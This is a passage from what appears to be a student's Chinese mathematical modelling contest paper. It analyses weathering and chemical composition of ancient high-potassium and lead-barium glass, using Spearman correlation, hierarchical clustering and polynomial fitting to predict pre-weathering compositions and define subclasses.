title="1.1问题背景"></a>1.1问题背景</h4><p>玻璃的出现与使用在人类的生活里已有四千多年的历史，早期的玻璃在西亚和埃及地区常被制作成珠形饰品。历史上古代玻璃经由丝绸之路传入我国，我国古代玻璃吸收其技术后在本土就地取材制作，因此与外来的玻璃制品外观相似，但化学成分却不相同。从西周到两汉时期中国境内玻璃制品化学成分的演变有自己独特的发展脉络，研究不同时期古代玻璃组成成分，对于了解古代金属冶炼技术与古代丝绸之路等有重大意义。</p><p>在长期的风化过程中，内部的各种氧化物与环境中的各种元素之间存在大量的物理和化学反应，一些组成元素的交换导致其组成比例的变化，这将影响对其类别的正确判断。</p><h4 id="1-2-具体问题重述"><a href="#1-2-具体问题重述" class="headerlink" title="1.2 具体问题重述"></a>1.2 具体问题重述</h4><p>现有一批我国古代玻璃制品的相关数据，考古工作者现已将其分为高钾玻璃和铅钡玻璃两种类型。</p><p>问题一：建立模型确定玻璃文物的表面风化与玻璃类型、纹饰和颜色是否具有关联关系，并根据玻璃类型分析文物表面风化前后化学成分含量变化的统计规律。根据风化点的检测数据，建立预测模型，预测该文物风化前各化学成分的所占比例。</p><p>问题二：由附件表单2中的数据分析高钾玻璃和铅钡玻璃的分类规则；对于每个类别，通过聚类分析选择合适的化学成分来划分其子类，给出具体的分类方法和划分结果，并分析划分结果的合理性和敏感性。</p><p>问题三：对附件表单 3 中未知类别玻璃文物的化学成分分析，鉴别其类型，并对分类结果的敏感性进行分析。</p><p>问题四：分析不同类型的玻璃样品化学组成之间的关联，比较不同类别玻璃文物样品之间关联关系的差异。</p><h3 id="二、问题分析"><a href="#二、问题分析" class="headerlink" title="二、问题分析"></a>二、问题分析</h3><h4 id="2-1对问题一的分析"><a href="#2-1对问题一的分析" class="headerlink" title="2.1对问题一的分析"></a>2.1对问题一的分析</h4><h5 id="2-1-1表面风化与玻璃类型、纹饰和颜色的关系"><a href="#2-1-1表面风化与玻璃类型、纹饰和颜色的关系" class="headerlink" title="2.1.1表面风化与玻璃类型、纹饰和颜色的关系"></a>2.1.1表面风化与玻璃类型、纹饰和颜色的关系</h5><p>分析表面风化与玻璃类型、纹饰和颜色的关系是经典的相关性分析，可以通过皮尔逊系数或斯皮尔曼系数分析相关性。皮尔逊系数进行关联性分析需要呈正态分布且是线性关系的连续变量，而玻璃类型、纹饰、颜色均为定类，而非定量故选择斯皮尔曼系数分析相关性。</p><h5 id="2-1-2文物样品表面有无风化化学成分含量的统计规律"><a href="#2-1-2文物样品表面有无风化化学成分含量的统计规律" class="headerlink" title="2.1.2文物样品表面有无风化化学成分含量的统计规律"></a>2.1.2文物样品表面有无风化化学成分含量的统计规律</h5><p>本文通过聚类分析，将14种不同变量进行聚类，并结合聚类结果，使用多项式曲线拟合，通过对不同指标的关系对风化前的化学成分利用构建的以小二乘法为思路的多元函数表达式进行求解。</p><p>经过数据处理后，可以发现高钾玻璃风化前后化学成分变化具有明显相关性，而铅钡玻璃则不具有明显相关性而无法使用多元线性回归模型求解。</p><p>继续通过多元线性回归模型预测高钾玻璃风化前数据，通过聚类结果并结合统计学规律预测铅钡玻璃风化前成分。</p><h4 id="2-2对问题二的分析"><a href="#2-2对问题二的分析" class="headerlink" title="2.2对问题二的分析"></a>2.2对问题二的分析</h4><p>要从化学成分含量角度分析高钾玻璃、铅钡玻璃的分类规律应建立在玻璃无风化、化学成分含量未被破坏的前提下，根据无风化状态下不同类型玻璃化学成分含量分布曲线，将无风化的高钾和铅钡玻璃各化学成分含量的均值曲线进行对比，分析得出高钾玻璃、铅钡玻璃的分类规律。 </p><p>根据化学成分进行亚分类是一个聚类问题，事先并不知道要分为多少类，我们考虑使用系统聚类法，将各样本作为聚类对象，依据其每种化学成分含量与其他样本各化学成分含量之间的联系进行聚类。系统聚类完成后得出初步聚类结果，而后加以统计学分析，从化学成分含量的角度找出各聚类组合之所以聚为一类的原因，对于一些规律不很明显的组合适当进行人工干预重新组合，提炼出分类特征从而形成类标签，实现基于化学成分的亚类划分。之后通过计算轮廓系数分析得到模型的合理性，并通过增添测试数据衡量分类的敏感性。</p><h4 id="2-3对问题三的分析"><a href="#2-3对问题三的分析" class="headerlink" title="2.3对问题三的分析"></a>2.3对问题三的分析</h4><p>在判别玻璃文物类型前，先将数据划分为无风化的未知类别玻璃文物数据和风化的未知类别玻璃文物数据，之后对表单2的数据规律按照风化和无风化进行总结，找到适合作为自变量的化学成分，确定自变量和因变量从而建立多元回归模型。</p><p>建立回归模型后再通过给予的未知类别玻璃文物数据计算出的预测结果并根据总结出来的数据规律判别是该化学成分属于高钾玻璃还是铅钡玻璃，最后根据哪一种类型可能性更大来决定该未知类别玻璃文物所属类型。</p><p>敏感性分析上更改各项系数中的一项，取附录2中数据代入计算，原计算结果与新数据的变化很明显，数据显著性很强。</p><h4 id="2-4对问题四的分析"><a href="#2-4对问题四的分析" class="headerlink" title="2.4对问题四的分析"></a>2.4对问题四的分析</h4><p>问题四属于相关性分析的问题类型，对于解决此类问题一般可以采用的分析方法包括多元线性回归模型，灰度分析等方法。</p><p>在问题一中，通过散点图和相关性分析可知，存在部分数据并不满足相关性，所以无法完全采用建立多元线性回归模型的方式完成分析，针对相关与不相关数据并存的情况，采用灰度关联分析的方式。求出相应的关联系数。</p><p>不同种类的玻璃其具有差异明显的化学成分关联关系，即具有对应关系系数，对关系系数进行排序，比较不同类别之间的化学成分关联关系的差异性。</p><h3 id="三、模型假设"><a href="#三、模型假设" class="headerlink" title="三、模型假设"></a>三、模型假设</h3><ol><li><p>附件表2中缺失数据部分，视为含量极小可以忽略不计；</p></li><li><p>假设高钾玻璃和铅钡玻璃在分类之初不考虑风化对其的影响；</p></li><li><p>不同类型玻璃，自身突出特性对其他化学成分的掩盖影响在划分亚类时应当剔除；</p></li><li><p>假设实验数据允许存在一定的误差范围；</p></li><li><p>假设在做对比实验时遵循控制变量法，控制其他实验条件完全相同；</p></li></ol><h3 id="四、符号说明及名词定义"><a href="#四、符号说明及名词定义" class="headerlink" title="四、符号说明及名词定义"></a>四、符号说明及名词定义</h3><table><thead><tr><th>符号</th><th>定义</th><th>单位</th></tr></thead><tbody><tr><td><img src=".\国赛数学建模\1.jpg" style="zoom:80%;" /></td><td>斯皮尔曼系数</td><td></td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C2.jpg"></td><td>等级差</td><td></td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C3.jpg"></td><td>多项式阶数</td><td>阶</td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C4.jpg"></td><td>比例系数</td><td></td></tr><tr><td>ρ</td><td>分辨系数</td><td></td></tr><tr><td>S</td><td>总轮廓系数</td><td></td></tr><tr><td><img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5C5.jpg"></td><td>关联度系数列表</td><td></td></tr></tbody></table><h3 id="五、模型的建立与求解"><a href="#五、模型的建立与求解" class="headerlink" title="五、模型的建立与求解"></a>五、模型的建立与求解</h3><h4 id="5-1问题一的求解与分析"><a href="#5-1问题一的求解与分析" class="headerlink" title="5.1问题一的求解与分析"></a>5.1问题一的求解与分析</h4><h5 id="5-1-1表面风化与玻璃类型、纹饰和颜色的关系"><a href="#5-1-1表面风化与玻璃类型、纹饰和颜色的关系" class="headerlink" title="5.1.1表面风化与玻璃类型、纹饰和颜色的关系"></a>5.1.1表面风化与玻璃类型、纹饰和颜色的关系</h5><p>**Step1.**表单1数据可视化</p><p>为了对这些玻璃文物的表面风化与其玻璃类型、纹饰和颜色的关系进行分析，我们首先对表单里的数据进行可视化，使用Python的matplotlib分别展示表面风化与玻璃类型、纹饰和颜色的数量关系条形图。其中，表单1的58个数据中，有3个铅钡风化玻璃的数据它的颜色变量是没有数据的，由于风化后的化学成分变化是不确定的，并且使用完整的55个数据进行可视化分析对表面风化与颜色的关系猜测影响很小，故在该步骤下删去。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps7.jpg"  /></center><center>图5-1 是否风化与玻璃种类的数量关系</center><img src=".\国赛数学建模\wps8.jpg"  /> <center>图5-2 是否与风化与玻璃纹饰的数量关系</center>![](.\国赛数学建模\wps9.jpg)![](.\国赛数学建模\wps10.jpg) <center>图5-3 是否风化与玻璃颜色数量关系</center>由折线图可知，铅钡玻璃数量较多，高钾玻璃数量较少。风化的铅钡玻璃数量较少，占比低，整体保存较好；而风化的高钾玻璃数量较多，占比高。其中，未风化的高钾玻璃只有蓝绿A纹玻璃和蓝绿B纹玻璃，高钾玻璃受风化影响较大。<p>**Step2.**斯皮尔曼系数关联性分析</p><p>我们根据条形图的数量关系可以猜测表面风化与玻璃类型间的关系最大，与颜色和纹饰间的关系很小。皮尔逊系数进行关联性分析需要呈正态分布且是线性关系的连续变量，与表单1所给的定类变量而不是连续变量不符合。故我们选择利用斯皮尔曼系数，将定序数据划分等级0或1（风化或未风化，高钾或铅钡）、1<del>8（玻璃颜色）和1</del>3（玻璃纹饰）表示，运用公式（5-1）进行表面风化与玻璃类型、纹饰和颜色的关联性分析得出斯皮尔曼系数<img src=".\国赛数学建模\1.jpg" style="zoom:80%;" />。设X，Y为两组数据，其中X为自变量X=(x1, x2, x3)=(类型，纹饰，颜色)，Y为因变量是否表面风化，其斯皮尔曼（等级）相关系数：</p><img src=".\国赛数学建模\wps11.jpg"  /> <p>其中，<img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5Cwps15.jpg">为<img src=".%5C%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%5Cwps16.jpg">和之间的等级差。</p><p>使用SPASS软件，计算斯皮尔曼相关系数，分析各变量与表面风化的关系。呈现结果如下表所示：</p><p>表5-1 斯皮尔曼系数</p><table><thead><tr><th>因变量</th><th>相关系数</th><th>表面风化</th></tr></thead><tbody><tr><td>类型</td><td>相关系数</td><td>0.037</td></tr><tr><td>Sig.(双尾)</td><td>0.781</td><td></td></tr><tr><td>纹饰</td><td>相关系数</td><td>0.344</td></tr><tr><td>Sig.(双尾)</td><td>0.008</td><td></td></tr><tr><td>颜色</td><td>相关系数</td><td>-0.107</td></tr><tr><td>Sig.(双尾)</td><td>0.442</td><td></td></tr></tbody></table><p>通过表格可见，斯皮尔曼相关系数<img src=".\国赛数学建模\1.jpg" style="zoom:80%;" /></p>  ，位于-1和1之间，应用正确。记玻璃纹饰A、B、C为1、2、3。分析得玻璃纹饰与表面风化成正相关（斯皮尔曼相关系数大于0）。从玻璃纹饰角度考虑风化的概率C&gt;B&gt;A，显著性大于0.05说明玻璃纹饰与表面风化的相关性不显著。记高钾玻璃为1，铅钡玻璃为2。分析得玻璃类型与表面风化成正相关（斯皮尔曼相关系数大于0）且其相关性在0.01级别（双尾），相关性显著。从玻璃类型角度考虑风化的概率铅钡玻璃大于高钾玻璃。对蓝绿、浅蓝、紫、深绿、深蓝、浅绿、绿、黑色玻璃编号为1~8，根据斯皮尔曼相关性分析得玻璃颜色与表面风化成负相关，显著性在0.4级别，说明相关性不显著。从颜色角度讲风化概率蓝绿&lt;浅蓝&lt;紫&lt;深绿&lt;深蓝&lt;浅绿&lt;绿&lt;黑色玻璃。</p><p>综上，表面风化和玻璃类型关系最大，和玻璃颜色与纹饰的关系不大。在接下来问题分析中，需要将玻璃类型考虑在内。</p><h5 id="5-1-2文物样品表面有无风化化学成分含量的统计规律"><a href="#5-1-2文物样品表面有无风化化学成分含量的统计规律" class="headerlink" title="5.1.2文物样品表面有无风化化学成分含量的统计规律"></a>5.1.2文物样品表面有无风化化学成分含量的统计规律</h5><p>**Step1.**表单2数据可视化</p><p>为了探究出文物样品表面有无风化化学成分含量的统计规律，我们统计出趋势、中位数、方差等。对数据进行均值比较和方差分析，根据结果使用Python进行数据可视化处理，画出无风化高钾玻璃和铅钡玻璃的化学成分比较折线图、高钾玻璃风化前后对比折线图和铅钡玻璃风化前后对比折线图进行观察。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps19.jpg" style="zoom: 67%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps20.jpg" style="zoom: 67%;" /></center><center>图5-4高钾玻璃风化前后对比折线图（加SiO2和不加SiO2）</center>高钾玻璃风化前后成分对比可知，风化前与风化后的折线变化基本一致，因为风化导致除二氧化硅以外化学成分比例都降低（氧化钠和氧化钾降低较明显）使二氧化硅有些升高外，整体变化稳定。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps25.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps26.jpg" style="zoom:80%;" /></center><center>图5-5铅钡玻璃风化前后对比折线图（加二氧化硅和不加二氧化硅）</center>铅钡玻璃风化前后成分对比可知，风化前与风化后的折线变化基本一致，除了因为风化导致部分化学成分降低使氧化铝和二氧化硅有明显升高外，其他元素比例变化稳定。<p>综上，风化前和风化后的化学成分比例整体变化一致，我们可以针对变化明显的化学成分进行分析找到倍数关系。</p><p>**Step2.**表单2数据处理</p><p>根据题目内容可知表单2给出的相应的主要成分所占比例累加和介于 85%<del>105%之间的数据视为有效数据。通过Excel求和公式，计算出69个文物采样点的主要成分所占比例累加和。其中文物采样点15累加和为79.47%和文物采样点17累加和为71.89%，二者不在85%</del>105%之间，故剔除数据。</p><p>通过对表单2的数据分类整理可知，高钾玻璃都不含有氧化锡，可以在高钾玻璃中不考虑该化学成分。同时，风化后的高钾玻璃不含有氧化钠，氧化铅，氧化钡，氧化锶及二氧化硫这五种化学成分，无法寻找风化前和风化后的联系，化学成分预测上宜通过未风化中的化学成分规律。并且使用SPSS工具进行聚类分析，同样会优先将其中一种单独聚为一类，我们由此认定在该项聚类中，这部分数据没有意义，舍弃进行进一步聚类。</p><p>通过对风化前与风化后化学元素变化折线图5-5和5-6可知，铅钡玻璃中氧化钾、氧化铝、氧化铜、氧化锶风化前与风化后比例没有明显改变，可以认为风化前与风化后比例没有变化，在接下来分析中不做考虑。</p><p>对高钾玻璃和铅钡玻璃的剩余化学成分进行聚类分析，使用SPASS软件分析出化学成分集合分组，即由类似对象组成多个类的结果。处理结果如图5-4和图5-5所示。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps27.png" style="zoom:67%;" /> </center><center>图5-6高钾玻璃各化学成分聚类谱系图</center>分析高钾玻璃各化学成分聚类谱系图可以发现，我们可以将二氧化硅作为第一类，氯化钾和氧化钙作为第二类，将氧化镁、氧化铝、氧化铁以及五氧化二磷作为第三类，将氧化铜作为第四类，从而实现数据的降维。将聚类结果和高钾玻璃统计规律的结果进行相互检验发现相符合。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps28.jpg" style="zoom:67%;" /> </center><center>图5-7铅钡玻璃各化学成分聚类谱系图</center>分析铅钡玻璃各化学成分聚类谱系图可以发现，我们可以将二氧化硅、氧化钠以及氧化铁作为第一类，氧化钙、氧化铅、氧化锡及二氧化硫作为第二类，将氧化镁作为第三类，将氧化二磷作为第四类，从而实现数据的降维。将聚类结果和铅钡玻璃统计规律进行相互检验发现相符合。<h5 id="5-1-3预测风化点在风化前的化学成分含量"><a href="#5-1-3预测风化点在风化前的化学成分含量" class="headerlink" title="5.1.3预测风化点在风化前的化学成分含量"></a>5.1.3预测风化点在风化前的化学成分含量</h5><p>**Step1.**高钾玻璃风化前的化学成分含量预测</p><p>根据相关性分析（分析结果见附录），二氧化硅和其他变量间都是强相关性，可以以二氧化硅为因变量，其他化学成分为自变量，对高钾玻璃的散点图进行曲线拟合。我们选择多项式曲线拟合进行少量数据的情况下拟合出比较好的曲线，原理如下：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps29.jpg" style="zoom: 80%;" /></center> 其中M是多项式的阶数（最高次数），<img src=".\国赛数学建模\wps30.jpg" style="zoom:80%;" />是多项式的系数，记作W。<p>使用python软件的sklearn库和matplotlib库生成拟合图，如图5-4所示（文中仅展示部分代表，拟合发现同一类化学成分的曲线趋势基本相同）。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps31.jpg" style="zoom:80%;" /> <img src="D:\gitee-blog\source\_posts\国赛数学建模\wps32.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps33.jpg" style="zoom:80%;" /></center><center>图5-8二氧化硅与其他化学成分的曲线拟合（高钾玻璃）</center>接下来我们还要求出W，建立对应拟合曲线的拟合函数，求出二氧化硅和其他7个化学成分的W值。如下表5-2所示。<center>表5-2二氧化硅和其他7个化学成分的W值</center>| 因变量     |                              W                               || ---------- | :----------------------------------------------------------: || 氧化钾     | [9.35606172e-06 -2.57806774e-03 2.53723140e-01 -1.06974030e+01 1.75202587e+02] || 氧化铝     | [-2.64094146e-05 8.11260817e-03 -9.27383442e-01 4.65868522e+01 -8.59053857e+02] || 氧化铜     | [-2.64094146e-05 8.11260817e-03 -9.27383442e-01 4.65868522e+01 -8.59053857e+02] || 氧化铁     | [2.65598539e-05 -8.49958292e-03 1.00819891e+00 -5.25574184e+01 1.01817760e+03] || 氧化钙     | [-2.66096268e-05 8.24388435e-03 -9.44132282e-01 4.71535967e+01 -8.58821425e+02] || 五氧化二铅 | [1.54677974e-05 -4.92447555e-03 5.80303071e-01 -2.99966231e+01 5.74887003e+02] || 氧化镁     | [2.51296158e-05 -7.72761458e-03 8.82922501e-01 -4.44354852e+01 8.32682964e+02] |<p>最后，对高钾玻璃中风化点在风化前的化学成分含量进行预测（W值在实际使用时小数点取前四位）。</p><p>对于前面分析中高钾玻璃采样点都不含有氧化锡所以该部分选择不填值。风化后的高钾玻璃不含有氧化钠，氧化铅，氧化钡，氧化锶及二氧化硫这五种化学成分，它们的化学含量占比小且最大差值小于2，我们可以用平均值表示这五个元素的化学含量。</p><center>表5-3化学成分比例平均值</center>| 化学成分 | 氧化钠 | 氧化铅 | 氧化钡 | 氧化锡 | 二氧化硫 || -------- | ------ | ------ | ------ | ------ | -------- || 平均值   | 2.7800 | 0.6420 | 1.7950 | 0.0975 | 0.4067   |<p>对于二氧化硅的未风化预测，根据前面分析，我们可以用一个比例系数K 来通过风化值求出未风化的值，利用统计规律求解出比例系数K=0.7280。</p><p>对于剩下的七个化学成分我们通过拟合出来的函数进行求解。最终未风化前的化学成分含量预测结果如下表5-4所示。</p><center>表5-4高钾玻璃中风化点在风化前的化学成分含量的预测结果</center>|        | SiO2    | Na2O   | K2O     | CaO     | MgO    | Al2O3  | Fe2O3  | CuO    | PbO    | BaO   | P2O5   | SrO    | SnO2 | SO2    || ------ | ------- | ------ | ------- | ------- | ------ | ------ | ------ | ------ | ------ | ----- | ------ | ------ | ---- | ------ || **7**  | 65.7673 | 2.7800 | 10.0032 | 11.5770 |        | 6.5340 | 1.6490 | 3.2400 | 0.6420 | 1.795 | 1.4701 | 0.0975 |      | 0.4067 || **9**  | 67.5920 | 2.7800 | 9.5951  | 4.2222  |        | 4.3560 | 3.1040 | 1.5500 | 0.6420 | 1.795 | 0.8435 | 0.0975 |      | 0.4067 || **1**  | 68.7067 | 2.7800 | 9.3013  | 1.4301  |        | 2.6730 | 2.5220 | 0.8400 | 0.6420 | 1.795 | 0.0000 | 0.0975 |      | 0.4067 || **12** | 66.9459 | 2.7800 | 9.7500  | 4.9032  |        | 4.8180 | 2.8130 | 1.6500 | 0.6420 | 1.795 | 0.3615 | 0.0975 |      | 0.4067 || **22** | 65.5685 | 2.7800 | 10.0422 | 11.3046 | 1.6400 | 11.550 | 3.3950 | 0.5500 | 0.6420 | 1.795 | 0.5061 | 0.0975 |      | 0.4067 || **27** | 65.8312 | 2.7800 | 9.9904  | 6.4014  | 1.5400 | 8.2830 | 1.9400 | 1.5400 | 0.6420 | 1.795 | 0.8676 | 0.0975 |      | 0.4067 |<p> **Step2.**铅钡玻璃风化前的化学成分含量预测</p><p>使用python软件的sklearn库和matplotlib库生成拟合曲线图，如图5-5所示：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps34.jpg" style="zoom:80%;" /><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps35.jpg" style="zoom:80%;" /></center><center>图5-9二氧化硅与其他化学成分的曲线拟合（铅钡玻璃）</center>通过图像可知，铅钡玻璃的散点图分布情况和高钾玻璃的散点图分布情况不一样，点在整张图上随机分布，故不能通过二氧化硅和其他化学成分拟合出合适的曲线进而得到拟合函数预测出铅钡玻璃风化前的化学成分含量。<p>根据上面聚类分析并结合表单2的统计学规律将铅钡玻璃所有变量划分为4个类，将其设为<img src=".\国赛数学建模\wps36.jpg" style="zoom:67%;" />。将铅钡玻璃中氧化钾、氧化铝、氧化铜、氧化锶风化前与风化后比例没有明显改变的4个变量的累加和设为定值<img src=".\国赛数学建模\wps37.jpg" style="zoom:67%;" />。根据统计学规律计算出的系数设为<img src=".\国赛数学建模\wps38.jpg" style="zoom:67%;" /> </p><p>建立模型为：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps39.jpg" style="zoom:100%;" /> </center><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps40.jpg" style="zoom:100%;" /> </center>将统计学规律计算出的系数<img src=".\国赛数学建模\wps41.jpg" style="zoom:80%;" />加入模型得：<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps42.jpg" style="zoom:100%;" /> </center>将铅钡玻璃的数据放入模型，最终未风化前的化学成分含量预测结果如下表5-5所示。<center>表5-5铅钡玻璃中风化点在风化前的化学成分含量的预测结果（部分）</center>|        | **SiO2** | **Na2O** | **K2O** | **CaO** | **MgO** | **Al2O3** | **Fe2O3** | **CuO** | **PbO** | **BaO** | **P2O5** | **SrO** | **SO2** || ------ | -------- | -------- | ------- | ------- | ------- | --------- | --------- | ------- | ------- | ------- | -------- | ------- | ------- || **2**  | 58.3986  |          | 1.5000  | 1.3343  | 0.9569  | 5.7300    | 3.8874    | 0.2600  | 27.8253 |         | 0.6645   | 0.1900  |         || **8**  | 59.6931  |          |         | 0.8437  |         | 1.3400    |           | 1.4100  | 16.3763 | 17.8323 | 0.6642   | 0.3700  | 1.4732  || **8**  | 62.6751  |          |         | 1.8186  |         | 1.1100    |           | 3.1400  | 18.5289 | 2.6720  | 1.3986   | 0.5300  | 8.7363  || **11** | 64.6478  |          | 0.2100  | 2.1510  | 0.5758  | 2.6900    |           | 4.9300  | 14.4977 | 8.3423  | 1.7353   | 0.3700  |         || **19** | 58.6627  |          |         | 1.67393 | 0.4784  | 3.5700    | 2.7797    | 3.5100  | 24.4522 | 3.5485  | 1.6336   | 0.1900  |         || **26** | 59.4844  |          |         | 0.82944 |         | 0.7000    |           | 1.5700  | 16.8616 | 18.4148 | 0.5795   | 0.4500  | 1.1192  |<h4 id="5-2问题二的求解与分析"><a href="#5-2问题二的求解与分析" class="headerlink" title="5.2问题二的求解与分析"></a>5.2问题二的求解与分析</h4><h5 id="5-2-1高钾玻璃、铅钡玻璃的分类规律"><a href="#5-2-1高钾玻璃、铅钡玻璃的分类规律" class="headerlink" title="5.2.1高钾玻璃、铅钡玻璃的分类规律"></a>5.2.1高钾玻璃、铅钡玻璃的分类规律</h5><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps43.jpg" style="zoom:80%;" /> </center><center>图5-10 无风化高钾玻璃和铅钡玻璃的化学成分比较折线图</center>假设高钾玻璃和铅钡玻璃在分类之初不考虑风化对其的影响。<p>通过表单2中的数据分析风化前高钾玻璃和铅钡玻璃各化学成分含量并计算出均值。由上图均值比对可得出如下规律：高钾玻璃氧化钾的含量远高于铅钡玻璃，铅钡玻璃氧化铅和氧化钡的含量远高于高钾玻璃，以化学成分含量为依据而将其分为高钾玻璃和铅钡玻璃，分类标准合理。</p><h5 id="5-2-2-数据预处理"><a href="#5-2-2-数据预处理" class="headerlink" title="5.2.2 数据预处理"></a>5.2.2 数据预处理</h5><p>在进行分类之前先进行数据的预处理。</p><p>玻璃的主要原料是石英砂，主要化学成分是二氧化硅（SiO2），所以二氧化硅这一化学成分的存在是古代玻璃所具有的共性，故将二氧化硅这一化学成分不作为分类依据。另外，针对不同类型的玻璃在分类时考虑自身突出特性对其他化学成分的掩盖影响应当剔除，由此铅钡玻璃在进行内部分类时，氧化铅和氧化钡不作为分类依据。同理，高钾玻璃在进行亚分类时氧化钾不作为分类依据。</p><p>数据来源上，将附件中表单2原始数据处理为高钾未风化、高钾风化、铅钡风化、铅钡无风化四种类型。根据假设条件，玻璃的分类是在完整未经风化状态下进行的，故而不考虑风化后的玻璃样本而将着眼点放在风化前的各样本数据上，这其中也包括了表面风化但局部未风化的样本即含有未风化点的样本，如23、25、28、29号文物等。经过数据剔除，最终考虑的样本数量状态为：无风化高钾玻璃12个样本，无风化铅钡玻璃23个样本。接下来对这些样本进行亚类划分。</p><h5 id="5-2-3-亚类划分"><a href="#5-2-3-亚类划分" class="headerlink" title="5.2.3 亚类划分"></a>5.2.3 亚类划分</h5><p>本文通过SPSS软件，采用系统聚类模型分别针对高钾和铅钡玻璃进行亚分类。</p><p>系统聚类分析将各样品各看成一类，然后计算类与类之间的距离，选择距离最小的一对合并为新类，计算新类与其他各类的距离，再将距离最近的两类合并，这样依次迭代，直到所有样品合为一类为之，由此实现不同样本之间的聚类。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps44.jpg" style="zoom:100%;" /> </center><center>图5-11 聚类分析基本思想</center>在确定要分类的数量时，本文采用肘部法则，用聚合系数折线图估计聚类的数量。聚合系数折线图的横纵坐标分别为聚类类别数K和聚合系数J。运用SPSS系统聚类分析可以得到聚合系数J，之后借助excel将系数降序排列，做出散点折线图，分析变化趋势。<center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps45.jpg" style="zoom:100%;" /> <img src="D:\gitee-blog\source\_posts\国赛数学建模\wps46.jpg" style="zoom:100%;" /></center><center>&nbsp&nbsp&nbsp&nbsp&nbsp图5-12 高钾玻璃聚类折线图&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp 图5-13铅钡玻璃聚类折线图&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp</center>由折线变化趋势可得高钾玻璃在聚类别数为3时下降趋势渐缓，故判定高钾玻璃最佳聚类数为3，同理，判定铅钡玻璃最佳聚类数为6。<p>另外，在亚类划分时要考虑适合的化学成分，意即在划分完成后仍需进一步分析系统聚类结果中化学成分的内在联系，由此，在聚类完成后加入主观统计学分析，以系统聚类分析的结果为基础，与均值的比对为指引，寻找同一类样本之间化学成分上的联系，进而总结出规律，必要时可以重新组合类。</p><p>下面首先进行系统聚类分析：</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps47.jpg" style="zoom:80%;" /> </center><center>图5-14 高钾玻璃12个样本的谱系图</center>表中纵轴以Casen的形式显示代表原表单中样本的排列顺序，以下分类中为方便表示直接使用数字n代表某样本。<center>表5-6 高钾玻璃文物采样点与序号的对应关系</center>| 序号   | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   | 12   || ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- || 采样点 | 01   | 03.1 | 03.2 | 04   | 0    | 06.1 | 06.2 | 13   | 14   | 16   | 21   | 18   |<center>表5-7 铅钡玻璃文物采样点与序号对应关系（部分）</center>| 序号   | 1    | 2    | 3    | 4    | 5    | 6    | 7    | 8    | 9    | 10   | 11   | 12   | …    || ------ | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- || 采样点 | 20   | 24   | 30.1 | 30.2 | 31   | 32   | 33   | 35   | 37   | 45   | 46   | 47   | …    |<p>注：03.1代表03部位1；03.2代表03部位2；30.1代表30部位1；30.2代表30部位2；</p><p>结合上图聚类结果将12个样本分为3类，分类结果如下： </p><center>表5-8 高钾玻璃初步聚类分析</center>| 类别  | 样本                || ----- | ------------------- || 类别1 | 1 2 3 4 5 8 9 10 11 || 类别2 | 6 7                 || 类别3 | 12                  |<p>之后进行统计学分析，观察各类之中有无化学成分含量突出或远高于均值的，抽象出分类标准。经过化学成分分析统计，比对得出高钾的三种分类标准：低铅钡、高磷、高铜。</p><center>表 5-9 高钾玻璃亚分类结果</center>| 类别            | 样本              || --------------- | ----------------- || 类别1（低铅钡） | 1 2 4 5 8 9 10 12 || 类别2（高磷）   | 6 7               || 类别3（高铜）   | 3 11              |<p> 同理，对于铅钡玻璃进行如下划分。</p><center><img src="D:\gitee-blog\source\_posts\国赛数学建模\wps48.jpg" style="zoom: 67%;" /> </center><center>图5-15 铅钡玻璃23个样品聚类情况</center>结合上图分类结果，将23个样本分为6类。<center>表 5-10 铅钡玻璃初步聚类分析</center>| 类别  | 样本                                    || ----- | --------------------------------------- || 类别1 | 1、21 、22                              || 类别2 | 12 、14 、18 、19                       || 类别3 | 6 、7 、8 、10 、11 、13、 15 、16、 23 || 类别4 | 4 、5                                   || 类别5 | 17 、20                                 || 类别6 | 2 、3、 9                               |<p>而后通过excel分析聚类中各化学成分含量，与均值进行比较得出5种分类标准：高磷、高钠、高铝、钙铁、高铜。</p><center>表5-11 铅钡玻璃亚分类结果</center>| 类别          | 样本                                    || ------------- | --------------------------------------- || 类别1（高磷） | 1 、21 、22                             || 类别2（高钠） | 12、 14 、18 、19 、13、 15             || 类别3（高铝） | 6、 7、 8 、10 、11 、16、 23 、17 、20 || 类别4（钙铁） | 3 、4、 5                               || 类别5（高铜） | 2 、9                                   |<h5 